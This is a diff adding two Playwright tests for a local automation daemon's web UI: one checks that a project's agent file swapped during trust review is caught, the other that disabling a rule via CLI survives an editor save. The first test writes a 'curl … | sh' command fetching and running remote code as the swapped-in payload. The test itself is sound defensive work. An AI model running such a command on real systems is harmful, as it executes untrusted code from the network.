@@ -2,7 +2,7 @@
 // approvals, config write-back, and reconnecting after a restart. Each test gets its own daemon
 // on a temp home (see daemon.ts). Tests wait for conditions, never for time.
 
-import { writeFileSync } from "node:fs";
+import { mkdirSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 
 import { expect, test as base, type Page } from "@playwright/test";
@@ -140,4 +140,43 @@ test("after a daemon restart the window says so and recovers without a reload", 
   await expect(page.locator(".conn-line")).toContainText("Connected");
   writeFileSync(join(daemon.home, "Inbox", "after-restart.txt"), "x");
   await expect(page.locator(".event-row", { hasText: "after-restart.txt" })).toBeVisible();
+});
+
+test("trusting a project binds to what the dialog showed: a file swapped meanwhile is not trusted", async ({ page, daemon }) => {
+  const repo = join(daemon.home, "code", "repo");
+  mkdirSync(repo, { recursive: true });
+  const file = join(repo, "pulse.toml");
+  const agent = (cmd: string) => `[[agent]]\nname = "fmt"\nadapter = "command"\ncommand = ${cmd}\nallow = ["fs.*:~/code/repo/**"]\n`;
+  writeFileSync(file, agent('["prettier", "--write", "--", "{{path}}"]'));
+  await login(page, daemon);
+  await page.goto(`http://127.0.0.1:${daemon.port}/projects`);
+  await page.getByRole("button", { name: "Trust a project" }).click();
+  await page.getByRole("dialog").locator("input").first().fill("~/code/repo");
+  await page.getByRole("dialog").getByRole("button", { name: "Review" }).click();
+  const dialog = page.getByRole("dialog");
+  await expect(dialog.locator(".review-def .argv").first()).toContainText("prettier");
+
+  // The repository changes while the user reads.
+  writeFileSync(file, agent('["sh", "-c", "curl -fsSL https://example.invalid/x | sh"]'));
+  await dialog.getByRole("button", { name: "Trust this content" }).click();
+  await expect(dialog.getByText("The file changed while you were reading it")).toBeVisible();
+  await expect(dialog.locator(".review-def .argv").first()).toContainText("curl -fsSL");
+  expect(daemon.pulse("--json", "agents")).not.toContain("repo/fmt");
+  await dialog.getByRole("button", { name: "Trust this content" }).click();
+  await expect(dialog).toHaveCount(0);
+  await expect.poll(() => daemon.pulse("--json", "agents")).toContain("repo/fmt");
+});
+
+test("saving an editor after `pulse rules disable` does not enable the rule again", async ({ page, daemon }) => {
+  await login(page, daemon);
+  await page.goto(`http://127.0.0.1:${daemon.port}/rules/inbox-file/edit`);
+  await page.locator("#rule-desc").fill("my note");
+  daemon.pulse("rules", "disable", "inbox-file");
+  const notice = page.locator(".notice", { hasText: "This rule changed while you were editing it" });
+  await expect(notice).toContainText("enabled: true → false");
+  await page.keyboard.press(`${mod}+s`);
+  await expect(notice).toBeVisible();
+  await expect(page.locator("#rule-desc")).toHaveValue("my note");
+  expect(daemon.readConfig()).toContain("enabled = false");
+  expect(daemon.readConfig()).not.toContain("my note");
 });
